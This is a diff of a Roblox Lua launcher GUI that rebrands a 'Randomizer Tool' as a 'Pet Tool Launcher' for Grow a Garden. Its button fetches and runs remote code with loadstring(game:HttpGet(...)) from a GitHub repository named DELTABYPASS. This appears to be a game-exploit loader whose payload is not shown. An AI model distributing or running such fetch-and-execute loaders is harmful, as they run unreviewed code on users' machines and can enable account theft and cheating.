@@ -1,61 +1,59 @@
--- Launcher UI for Randomizer Script
+-- UI Launcher for Grow a Garden Pet Script
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
--- Main Screen GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "RandomizerLauncher"
+-- GUI Setup
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.Name = "PetLauncherUI"
 gui.ResetOnSpawn = false
-gui.Parent = PlayerGui
 
--- Frame Setup
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 240, 0, 120)
-frame.Position = UDim2.new(0.4, 0, 0.4, 0)
-frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+frame.Size = UDim2.new(0, 250, 0, 130)
+frame.Position = UDim2.new(0.37, 0, 0.4, 0)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
-frame.BorderSizePixel = 0
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
--- Title Label
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "🎮 Randomizer Tool"
+title.Text = "🐾 Pet Tool Launcher"
 title.Font = Enum.Font.GothamBold
 title.TextSize = 18
 title.TextColor3 = Color3.new(1, 1, 1)
 
--- Launch Button
 local launchBtn = Instance.new("TextButton", frame)
-launchBtn.Size = UDim2.new(0.9, 0, 0, 35)
-launchBtn.Position = UDim2.new(0.05, 0, 0.4, 0)
-launchBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 140)
-launchBtn.Text = "Launch Randomizer"
+launchBtn.Size = UDim2.new(0.9, 0, 0, 40)
+launchBtn.Position = UDim2.new(0.05, 0, 0.45, 0)
+launchBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+launchBtn.Text = "Launch Pet Tool"
 launchBtn.Font = Enum.Font.GothamBold
 launchBtn.TextSize = 16
 launchBtn.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", launchBtn).CornerRadius = UDim.new(0, 8)
+Instance.new("UICorner", launchBtn).CornerRadius = UDim.new(0, 10)
 
--- Instruction Label
 local info = Instance.new("TextLabel", frame)
 info.Size = UDim2.new(1, 0, 0, 30)
-info.Position = UDim2.new(0, 0, 0.75, 0)
+info.Position = UDim2.new(0, 0, 0.82, 0)
 info.BackgroundTransparency = 1
-info.Text = "Drag to move | Click button to load"
+info.Text = "Click to load script"
 info.Font = Enum.Font.Gotham
 info.TextSize = 14
-info.TextColor3 = Color3.fromRGB(200, 200, 200)
+info.TextColor3 = Color3.fromRGB(180, 180, 180)
 
--- Launch Logic
+-- Click Behavior
 launchBtn.MouseButton1Click:Connect(function()
-    -- Play click animation
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 160)
-    task.wait(0.15)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 140)
-    -- Run loadstring script
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderHubz/RANDOMIZER/refs/heads/main/Release.lua"))()
+    launchBtn.Text = "Loading..."
+    launchBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Petspawner1/DELTABYPASS/refs/heads/main/ThunderGag"))()
+
+    end)
+    wait(1)
+    launchBtn.Text = "Launch Pet Tool"
+    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
 end)
